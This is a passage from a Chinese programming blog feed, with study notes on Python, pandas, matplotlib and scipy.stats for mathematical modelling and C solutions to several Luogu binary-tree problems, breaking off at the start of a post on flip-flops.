<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&quot;</span>) <span class="keyword">as</span> file:</span><br></pre></td></tr></table></figure>
<h3 id="文件对象属性"><a class="header-anchor" href="#文件对象属性">¶</a>文件对象属性</h3>
<p>​	主要有三个，即<strong>closed</strong>、<strong>mode</strong>和<strong>name</strong>，第一个判断文件是否被关闭，是则返回True，第二个返回文件打开方式，第三个返回文件名</p>
<h2 id="文本文件的读写操作"><a class="header-anchor" href="#文本文件的读写操作">¶</a>文本文件的读写操作</h2>
<p>​	用文件对象的**read()<strong>方法将内容读入到变量中，用</strong>writelines()**方法将变量写入到文件中</p>
<p>​	然后这里有一个**enumerate()**函数，参数是一个列表，返回列表中的索引和它的值</p>
<h2 id="文件管理方法"><a class="header-anchor" href="#文件管理方法">¶</a>文件管理方法</h2>
<p>​	Python的<strong>os</strong>模块提供了类似操作系统的文件管理功能，可以用listdir方法显示目录内容，用rename方法进行重命名，然后还有mkdir方法，chdir方法，getcwd方法，rmdir()方法，和操作系统中的差不多，就不多说了</p>
<h1>Pandas</h1>
<h2 id="基本操作-v2"><a class="header-anchor" href="#基本操作-v2">¶</a>基本操作</h2>
<p>​	比如**mean()**方法，计算样本数据的算术平均值，**std()**方法，计算样本数据标准差，**cov()**方法，计算样本数据的协方差矩阵，**var()**方法，计算样本数据的方差，**dexcribe()**方法，用来描述数据的一些基本情况</p>
<h2 id="序列和数据框"><a class="header-anchor" href="#序列和数据框">¶</a>序列和数据框</h2>
<p>​	主要有三种数据结构，分别是序列，数据框，面板，分别从一维到三维</p>
<h3 id="序列"><a class="header-anchor" href="#序列">¶</a>序列</h3>
<p>​	构造方法有如下几种：</p>
<ol>
<li>通过同类型的列表或元组构建</li>
<li>通过字典构建</li>
<li>通过NumPy中的一维数组构建</li>
<li>通过数据框中的某一列构建</li>
</ol>
<p>​    然后看如下例子即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">s1=pd.Series(np.array([<span class="number">10.5</span>,<span class="number">20.5</span>,<span class="number">30.5</span>])) <span class="comment">#由数组构造序列</span></span><br><span class="line">s2=pd.Series(&#123;<span class="string">&quot;Beijing&quot;</span>:<span class="number">10.5</span>,<span class="string">&quot;Shanghai&quot;</span>:<span class="number">20.5</span>,<span class="string">&quot;Guangzhou&quot;</span>:<span class="number">30.5</span>&#125;) <span class="comment">#由字典构造序列</span></span><br><span class="line">s3=pd.Series([<span class="number">10.5</span>,<span class="number">20.5</span>,<span class="number">30.5</span>],index=[<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]) <span class="comment">#给出行标签命名</span></span><br></pre></td></tr></table></figure>
<p>​	序列由两列构成，第一列是行索引，由数组构造的话，默认从0开始，第二列才是实际值。</p>
<p>​	序列与一维数组有着极高的相似性，获取一维数组元素的所有方法都可以应用在序列上，包括各种函数也可以，但是序列会有更多其他的解决办法，比如上一小节中的函数都可以对序列去使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">s=pd.Series([<span class="number">10.5</span>,<span class="number">20.5</span>,<span class="number">30.5</span>],index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">a=s[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">b1=np.mean(s)</span><br><span class="line">b2=s.mean()</span><br><span class="line">b3=s.std()</span><br></pre></td></tr></table></figure>
<h3 id="数据框"><a class="header-anchor" href="#数据框">¶</a>数据框</h3>
<p>​	数据库是由行和列构成的二维数据结构，可以这样创建：<strong>DataFrame(data=二维数据 [, index=行索引[,columns=列索引[,dtype=数据类型]]])</strong>，其中data可以是二维NumPy数组，如果是字典的话，值为一维数组，键为数据框列名，下面给一个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">a=np.arange(<span class="number">1</span>,<span class="number">10</span>).reshape(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">df1=pd.DataFrame(a) <span class="comment">#默认创建</span></span><br><span class="line">df2=pd.DataFrame(a,index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>],columns=[<span class="string">&#x27;x1&#x27;</span>,<span class="string">&#x27;x2&#x27;</span>,<span class="string">&#x27;x3&#x27;</span>]) <span class="comment">#自定义行列名</span></span><br><span class="line">df3=pd.DataFrame(&#123;<span class="string">&#x27;x1&#x27;</span>:a[:,<span class="number">0</span>],<span class="string">&#x27;x2&#x27;</span>:a[:,<span class="number">1</span>],<span class="string">&#x27;x3&#x27;</span>:a[:,<span class="number">2</span>]&#125;) <span class="comment">#字典定义</span></span><br></pre></td></tr></table></figure>
<p>​	下面是相应的输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line"><span class="number">1</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span></span><br><span class="line"><span class="number">2</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span></span><br><span class="line">   x1  x2  x3</span><br><span class="line">a   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">b   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span></span><br><span class="line">c   <span class="number">7</span>   <span class="number">8</span>   <span class="number">9</span></span><br><span class="line">   x1  x2  x3</span><br><span class="line"><span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">1</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span></span><br><span class="line"><span class="number">2</span>   <span class="number">7</span>   <span class="number">8</span>   <span class="number">9</span></span><br></pre></td></tr></table></figure>
<h2 id="外部文件的存取"><a class="header-anchor" href="#外部文件的存取">¶</a>外部文件的存取</h2>
<h3 id="文本文件读取"><a class="header-anchor" href="#文本文件读取">¶</a>文本文件读取</h3>
<p>​	**read_csv()**函数可以读取txt和csv文件，后者是用逗号分隔的文本文件，参数非常多，以后需要用到的时候百度吧，下面列几个常用的参数，<strong>filepath_or_buffer</strong>，第一个参数，可以是URL或文件路径，<strong>sep</strong>，指定分隔符，如果不指定默认为逗号，以后用到的时候再补充</p>
<h3 id="excel"><a class="header-anchor" href="#excel">¶</a>excel</h3>
<p>​	**read_excel()**函数可以读取excel文件，参数大概和read_csv()函数差不多，需要用到的时候再百度吧</p>
<p>​	要想向excel文件中写数据，需要用<strong>ExcelWriter</strong>来创建文件对象，需要将从excel文件中读取的数据转换成数据框才行。</p>
<h3 id="数据子集的获取"><a class="header-anchor" href="#数据子集的获取">¶</a>数据子集的获取</h3>
<p>​	获取数据子集有两种方式，分别是<strong>iloc</strong>和<strong>loc</strong>，语法为**[rows_select,cols_select]**，前者只能通过标号筛选数据，后者可以通过标签筛选数据</p>
<h1>Matplotlib可视化</h1>
<h2 id="基础用法"><a class="header-anchor" href="#基础用法">¶</a>基础用法</h2>
<p>​	该模块提出了对象容器概念，有<strong>Figure</strong>、<strong>Axes</strong>、<strong>Axis</strong>和<strong>Tick</strong>四种类型，分别负责图形大小与位置、坐标轴位置与绘图、坐标轴的设置、格式化刻度的样式</p>
<p>​	画折线图常用的函数为<strong>plot(x,y,s)</strong>，三个常用参数分别为横纵坐标和线条颜色样式及数据点颜色。另外可以用**pie()<strong>绘制饼状图，用</strong>bar()<strong>绘制柱状图，用</strong>hist()<strong>绘制二维直方图，用</strong>scatter()**绘制散点图，这些函数的参数大抵都是差不多的，需要用到的时候直接百度就好了。</p>
<p>​	然后用该模块画图的时候中文和负号通常显示的是乱码，需要进行如下设置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>]=<span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br></pre></td></tr></table></figure>
<p>​	用**xlabel()<strong>和</strong>ylabel()<strong>来添加横纵坐标名称，另外绘图的时候可以添加标签，即加入</strong>label=<strong>参数，结合</strong>legend()**函数可以生成一个图片样式的框，如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326171133690.png" alt="image-20220326171133690"></p>
<p>​	另外如果想要使用Latex格式的话需要使用<strong>rc(‘text’,usetex=True)</strong></p>
<p>​	然后如果想要在一张图片上展示多个图片的话，应该用**subplot()**函数，然后三个参数指定位置</p>
<p>​	如果要画空间曲线的话，需要<strong><em>from</em> mpl_toolkits <em>import</em> mplot3d</strong>，然后设置三维图形模式，参见如下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ax=plt.axes(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">z=np.linspace(<span class="number">0</span>,<span class="number">100</span>,<span class="number">1000</span>)</span><br><span class="line">x=np.sin(z)*z</span><br><span class="line">y=np.cos(z)*z</span><br><span class="line">ax.plot3D(x,y,z)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>​	如果要画三维曲面图形的话，首先根据x和y的数据，利用<strong>meshgrid(x,y)<strong>方法将其转换成二维网格数据，然后用</strong>plot_surface()<strong>方法可以画图，如果要画网格图形的话，需要用方法</strong>plot_wireframe()</strong>，具体代码见下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mpl_toolkits <span class="keyword">import</span> mplot3d</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> numpy.lib.function_base <span class="keyword">import</span> meshgrid</span><br><span class="line">x=np.linspace(-<span class="number">6</span>,<span class="number">6</span>,<span class="number">30</span>)</span><br><span class="line">y=np.linspace(-<span class="number">6</span>,<span class="number">6</span>,<span class="number">30</span>)</span><br><span class="line">X,Y=np.meshgrid(x,y)</span><br><span class="line">Z=np.sin(np.sqrt(X**<span class="number">2</span>+Y**<span class="number">2</span>))</span><br><span class="line">ax1=plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">ax1.plot_surface(X,Y,Z,cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">ax1.set_xlabel(<span class="string">&#x27;x&#x27;</span>);ax1.set_ylabel(<span class="string">&#x27;y&#x27;</span>);ax1.set_zlabel(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">ax2=plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">ax2.plot_wireframe(X,Y,Z,color=<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">ax2.set_xlabel(<span class="string">&#x27;x&#x27;</span>);ax2.set_ylabel(<span class="string">&#x27;y&#x27;</span>);ax2.set_zlabel(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326171157678.png" alt="image-20220326171157678"></p>
<p>​		剩下的等高线和向量图等用到的时候再说吧</p>
<h1>scipy.stats模块简介</h1>
<h2 id="随机变量及其分布"><a class="header-anchor" href="#随机变量及其分布">¶</a>随机变量及其分布</h2>
<p>​	这个模块的主要内容就是各种概率分布的随机变量，这里就用到的时候百度就好了</p>
<h2 id="概率密度函数及其分布律可视化"><a class="header-anchor" href="#概率密度函数及其分布律可视化">¶</a>概率密度函数及其分布律可视化</h2>
<p>​	这里就画个$\Gamma$函数就完事，需要用**gamma.pdf(x,a,loc=0,scale=1)**来生成，概率密度函数为$f(x)=\frac{x<sup>{\alpha-1}}{\beta</sup>{\alpha}} \cdot \frac{e^{-\frac{x}{\beta}}}{\Gamma(\alpha)},x&gt;0,\alpha&gt;0,\beta&gt;0$</p>
<p>​	下面给出画图的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.stats <span class="keyword">import</span> gamma</span><br><span class="line">x=np.linspace(<span class="number">0</span>,<span class="number">15</span>,<span class="number">100</span>);plt.rc(<span class="string">&#x27;font&#x27;</span>,size=<span class="number">15</span>)</span><br><span class="line">plt.plot(x,gamma.pdf(x,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>),<span class="string">&#x27;r*-&#x27;</span>,label=<span class="string">&quot;$\\alpha=4,\\beta=2$&quot;</span>)</span><br><span class="line">plt.plot(x,gamma.pdf(x,<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;bp-&#x27;</span>,label=<span class="string">&quot;$\\alpha=4,\\beta=1$&quot;</span>)</span><br><span class="line">plt.plot(x,gamma.pdf(x,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0.5</span>),<span class="string">&#x27;.k-&#x27;</span>,label=<span class="string">&quot;$\\alpha=4,\\beta=0.5$&quot;</span>)</span><br><span class="line">plt.plot(x,gamma.pdf(x,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0.5</span>),<span class="string">&#x27;&gt;g-&#x27;</span>,label=<span class="string">&quot;$\\alpha=2,\\beta=0.5$&quot;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.xlabel(<span class="string">&#x27;$x$&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;$f(x)$&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326171219733.png" alt="image-20220326171219733"></p>
<h1>总结</h1>
<p>​	到这里用Python进行数学建模方面关于Python的基本语法就相当于介绍完毕了，接下来就是关于各种常见模型和算法的总结</p>
]]></content>
      <categories>
        <category>数学</category>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数学建模</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构刷题之二叉树</title>
    <url>/2021/10/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%B7%E9%A2%98%E4%B9%8B%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1 id="洛谷P1229"><a href="#洛谷P1229" class="headerlink" title="洛谷P1229"></a>洛谷P1229</h1><h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p>​    输入一个二叉树的前序遍历和后序遍历序列，求可能的中序遍历序列的个数。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​    首先之所以此时有多种二叉树，是因为在只有一个孩子的情况下无法确定它是左孩子还是右孩子，所以每次找到这样的一种情况，答案需要翻倍，而如果当前根前序遍历的后一个和后序遍历的前一个相同，那么它就是这样的一个结点</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-10-09 13:11:11 </span></span><br><span class="line"><span class="comment"> * @Last Modified by: ysj</span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-10-09 13:22:01</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//本问题通过二叉树的前序遍历和后续遍历，要求共有多少种中序遍历</span></span><br><span class="line"><span class="comment">//首先我们考虑一下为什么中序遍历不唯一，因为前序为根左右，后序为左右根，只能判断出祖先，而其中树的结构无法确定</span></span><br><span class="line"><span class="comment">//不能确定就是因为里面可能含有单叶子结点，可以考虑如何使用两种遍历顺序确定单叶子结点，每多一个单叶子结点，总数翻倍</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> pre[<span class="number">100000001</span>];</span><br><span class="line"><span class="keyword">char</span> post[<span class="number">100000001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, pre);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, post);</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(pre)<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j = find(pre[i]);<span class="comment">//找到后序遍历中对应的索引值</span></span><br><span class="line">        <span class="keyword">if</span>(j&lt;<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(pre[i+<span class="number">1</span>]==post[j<span class="number">-1</span>])<span class="comment">//前序的后一个等于后序的前一个，实际上就是当前根节点只有一个孩子</span></span><br><span class="line">            ans *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(post);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(post[i]==key)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="洛谷P4715"><a href="#洛谷P4715" class="headerlink" title="洛谷P4715"></a>洛谷P4715</h1><h2 id="题目大意-1"><a href="#题目大意-1" class="headerlink" title="题目大意"></a>题目大意</h2><p>​    有 $2^n(n\le7)(n≤7)$ 个国家参加世界杯决赛圈且进入淘汰赛环节。我经知道各个国家的能力值，且都不相等。能力值高的国家和能力值低的国家踢比赛时高者获胜。1 号国家和 2 号国家踢一场比赛，胜者晋级。3 号国家和 4 号国家也踢一场，胜者晋级……晋级后的国家用相同的方法继续完成赛程，直到决出冠军。给出各个国家的能力值，请问亚军是哪个国家？</p>
<h2 id="思路简介"><a href="#思路简介" class="headerlink" title="思路简介"></a>思路简介</h2><p>​    没看出来和二叉树有什么关系，直接用一个数组存着就行</p>
<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&gt;(b)?(b):(a))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">team</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> index, power;</span><br><span class="line">&#125; team;</span><br><span class="line">team teams[<span class="number">1500</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> num = <span class="built_in">pow</span>(<span class="number">2</span>, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;teams[i].power);</span><br><span class="line">        teams[i].index = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; num;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(teams[i].power&gt;teams[i+<span class="number">1</span>].power)</span><br><span class="line">                teams[len++] = teams[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                teams[len++] = teams[i + <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        n--;</span><br><span class="line">        num = num / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(teams[<span class="number">1</span>].power&gt;teams[<span class="number">2</span>].power)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, teams[<span class="number">2</span>].index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, teams[<span class="number">1</span>].index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="洛谷P1364"><a href="#洛谷P1364" class="headerlink" title="洛谷P1364"></a>洛谷P1364</h1><h2 id="题目大意-2"><a href="#题目大意-2" class="headerlink" title="题目大意"></a>题目大意</h2><p><img src="/images/P1364.png" alt></p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​    看评论说这道题数据很水，可以直接用floyd算法暴力枚举通过，所以也就这样去做了，关于floyd算法可以参看之前的文章</p>
<h2 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">101</span>], f[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=j)</span><br><span class="line">            f[i][j] = <span class="number">1000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> le, ri;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a[i], &amp;le, &amp;ri);</span><br><span class="line">        <span class="keyword">if</span> (le)</span><br><span class="line">            f[le][i] = f[i][le] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (ri)</span><br><span class="line">            f[ri][i] = f[i][ri] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="comment">//以上用来初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// if (i != k)</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="comment">/*i != j &amp;&amp; j != k &amp;&amp; */</span>f[i][k] + f[k][j] &lt; f[i][j])</span><br><span class="line">                        f[i][j] = f[i][k] + f[k][j];</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//floyd算法</span></span><br><span class="line">    <span class="keyword">int</span> ans = INT_MAX;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            sum += a[j] * f[i][j];</span><br><span class="line">        <span class="keyword">if</span>(ans&gt;sum)</span><br><span class="line">            ans = sum;</span><br><span class="line">    &#125;<span class="comment">//枚举所有点</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>​    这一道题在题解区有大佬给出了$O(n)$的算法，定义了树的<strong>重心</strong>，其定义为，树若以某点为根，使得该树的最大子树的结点数最小，那么这个点为该树的重心，具有以下性质：</p>
<ol>
<li>所有点到重心的距离之和最短</li>
<li>插入或删除一个点，重心最多移动一个单位</li>
<li>若添加一条边连接两棵树，那么新树的中心一定在原来两棵树的重心路径上</li>
</ol>
<p>​    求法如下：</p>
<p>​    定义几个数组：f[u]表示以u为根的总距离，size[u]表示以u为根的子树的大小（结点数，<strong>此题每个点要乘以权值</strong>，下文结点数均指此）。</p>
<p>​    显然，ans=min(f[i],1&lt;=i&lt;=n)<em>a<strong>n</strong>s</em>=<em>m<strong>i</strong>n</em>(<em>f</em>[<em>i</em>],1&lt;=<em>i</em>&lt;=<em>n</em>)</p>
<p>​    首先我们任意以一个点为根dfs一遍，求出以该点为根的总距离。方便起见，我们就以1为根。</p>
<p>​    接下来就是转移，对于每个u能达到的点v，有：</p>
<p>​    $f[v]=f[u]+size[1]-size[v]-size[v]$</p>
<p>​    怎么来的呢？试想，当根从u变为v的时候，v的子树的所有节点原本的距离要到u，现在只要到v了，每个结点的距离都减少1，那么总距离就减少size[v]，同时，以v为根的子树以外的所有节点，原本只要到u就行了，现在要到v，每个节点的路程都增加了1，总路程就增加了size[1]-size[v]，其中size[1]就是我们预处理出来的整棵树的大小，减去size[v]就是除以v为根的子树以外的结点数。</p>
<p>​    最后取最小值，得解。</p>
<p><strong><em>以上求法摘自高赞题解</em></strong></p>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>二叉树</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>时序逻辑</title>
    <url>/2021/12/15/%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91/</url>
    <content><![CDATA[<h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><p>​    触发器是一种具有记忆功能的电子器件</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li>有两个互补的输出端$Q$和$\overline{Q}$</li>
<li>有两个稳定状态，通常将$Q=1$和$\overline{Q}=0$称为1状态，另外那个称为0状态，当输入信号不变的时候输出信号也不变</li>
<li>在一定输入信号的作用下，触发器可以从一个稳定状态转移到另外一个稳定状态，现态称为输入信号作用前的状态，用$Q_n$和$\overline{Q_n}$表示，简记的时候n可以省略；而次态称为输入信号作用后的状态，用$Q_{n+1}$和$\overline{Q_{n+1}}$，次态是现态和输入的函数</li>
</ol>
<h2 id="R-S触发器"><a href="#R-S触发器" class="headerlink" title="R-S触发器"></a>R-S触发器</h2><ol>
<li><p>用与非门构成的R-S触发器功能</p>
